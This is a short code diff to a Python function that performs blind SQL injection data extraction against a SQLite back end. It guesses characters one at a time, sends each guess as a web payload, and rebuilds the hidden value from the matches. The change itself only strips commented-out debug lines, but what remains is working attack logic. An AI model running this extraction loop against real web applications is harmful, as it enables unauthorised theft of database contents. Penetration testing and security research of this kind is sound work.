@@ -86,22 +86,15 @@ def request_blind(sql, db):
             returned_value += chr(result)
     elif db == 'sqlite':
         charset = string.ascii_letters+string.digits+string.punctuation+' '
-        #locked = False
         while True:
             result = ''
             for ch in charset:
                 payload = compare_eq(ch, sql, pos, db)
                 time.sleep(sleep_time)
                 if web_request(payload):
-                    #print 'found', ch
                     result = ch
                     break
-            #if not result and locked:
-            #    print 'we break'
-            #    break
             if not result:
-            #    print 'we lock'
-            #    locked = True
                 break
             if result:
                 returned_value += ch
